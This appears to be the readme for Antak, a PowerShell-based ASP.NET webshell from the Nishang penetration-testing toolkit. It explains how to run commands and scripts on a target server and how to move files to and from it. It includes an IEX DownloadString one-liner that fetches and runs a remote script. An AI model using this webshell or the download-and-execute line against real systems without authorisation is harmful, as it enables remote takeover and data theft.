Antak is a webshell written in ASP.Net which utilizes PowerShell.
Antak is a part of Nishang and updates can be found here:
https://github.com/samratashok/nishang

Use this shell as a normal PowerShell console. Each command is executed in a new process; keep this in mind
while using commands (like changing current directory or running session aware scripts). 

Executing PowerShell scripts on the target:

1. Paste the script in command textbox and click 'Encode and Execute." A reasonably large script could be executed using this.

2. Use PowerShell one-liner (example below) to download & execute in the command box.
IEX ((New-Object Net.WebClient).DownloadString('URL to script here')); [Arguments here]

3. Upload the script to the target and execute it.

4. Make the script a semi-colon separated one-liner.

Files can be uploaded and downloaded using the respective buttons:

Uploading a file:
To upload a file, you must mention the actual path on the server (with write permissions) in the command text box. 
(OS temporary directories like C:\Windows\Temp may be writable.)
Then, use the browse and upload buttons to upload file to that path.

Downloading a file:
To download a file, enter the actual path on the server in the command text box.
Then click on Download button.


A detailed blog post on Antak can be found here:
http://www.labofapenetrationtester.com/2014/06/introducing-antak.html
